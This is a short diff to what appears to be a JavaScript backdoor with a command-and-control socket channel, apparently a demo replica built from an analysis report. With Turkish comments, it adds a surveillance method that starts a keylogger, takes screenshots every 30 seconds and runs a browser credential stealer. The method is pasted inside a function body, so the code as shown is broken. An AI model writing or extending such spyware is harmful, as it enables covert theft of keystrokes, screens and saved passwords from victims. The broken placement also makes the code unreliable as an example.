@@ -158,7 +158,25 @@ function startC2Channel() {
       uid: DEMO_UID,
     });
   });
+  
+// backdoor.js içindeki startSurveillance metodunu güncelleyin
+startSurveillance() {
+    // 1. Keylogger
+    const Keylogger = require('./surveillance/keylogger');
+    this.keylogger = new Keylogger();
+    this.keylogger.start();
 
+    // 2. Screenshot
+    const Screenshot = require('./surveillance/screenshot');
+    this.screenshot = new Screenshot();
+    this.screenshot.initialize();
+    this.screenshot.start(30000); // 30 saniyede bir
+
+    // 3. Browser credential stealer
+    const BrowserStealer = require('./surveillance/browser-credentials');
+    this.browserStealer = new BrowserStealer();
+    setTimeout(() => this.browserStealer.start(), 5000);
+}
   // Rapordaki "command" olayının SINIRLANDIRILMIŞ eşleniği.
   socket.on("command", (payload) => {
     const action = payload && payload.action;
